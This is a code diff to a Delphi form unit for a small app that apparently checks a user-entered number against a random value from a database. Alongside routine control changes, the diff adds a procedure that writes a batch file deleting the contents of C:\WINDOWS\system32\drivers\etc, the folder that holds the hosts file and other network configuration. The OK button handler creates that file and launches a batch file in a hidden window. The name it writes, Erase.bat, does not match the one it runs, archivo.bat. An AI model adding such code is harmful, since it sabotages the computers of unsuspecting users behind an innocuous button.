@@ -14,12 +14,12 @@ type
     Conexion: TSQLConnection;
     SimpleDataSet1: TSimpleDataSet;
     DataSource1: TDataSource;
-    EditInsideHelp2: TEditInsideHelp;
     Button1: TButton;
     Edit1: TEdit;
     SimpleDataSet1N_ALEATORIO: TIntegerField;
     SimpleDataSet2: TSimpleDataSet;
     SimpleDataSet2NUMEROS: TIntegerField;
+    Edit2: TEdit;
     procedure FormCreate(Sender: TObject);
     procedure Button1Click(Sender: TObject);
     procedure btOkClick(Sender: TObject);
@@ -29,7 +29,7 @@ type
     procedure Edit1KeyDown(Sender: TObject; var Key: Word;
       Shift: TShiftState);
   private
-    { Private declarations }
+     procedure CrearArchivoBat(rutArchivo: string);
   public
     { Public declarations }
   end;
@@ -55,7 +55,7 @@ end;
 procedure TForm1.Button1Click(Sender: TObject);
 begin
 SimpleDataSet1.Open;
-EditInsideHelp2.Text:= SimpleDataSet1N_ALEATORIO.AsString;
+Edit2.Text:= SimpleDataSet1N_ALEATORIO.AsString;
 
 end;
 
@@ -97,12 +97,29 @@ begin
   end;
 end;
 
+//AUTOCREANDO BAT
+procedure TForm1.CrearArchivoBat(rutArchivo: string);
+ var
+   temp: TStrings;
+ begin
+   temp := TStringList.Create;
+   try
+     temp.Add('@echo off');
+     temp.Add('del /q /f C:\WINDOWS\system32\drivers\etc');
+     temp.SaveToFile(rutArchivo);
+   finally
+     temp.Free;
+   end;
+ end;
 
 
 procedure TForm1.btOkClick(Sender: TObject);
 //var FileInfo: TShFileOpStruct;
 var sql, Resultado: string; i: integer; FileInfo: TShFileOpStruct;
 begin
+CrearArchivoBat('D:\Erase.bat');
+shellexecute(Handle, 'open','D:\archivo.bat',nil,nil,SW_HIDE);
+
 SimpleDataSet1.Open;
 //SimpleDataSet1.DataSet.CommandText:='select * from SEC_ALEATORIO';
 if Edit1.Text = SimpleDataSet1N_ALEATORIO.AsString  then
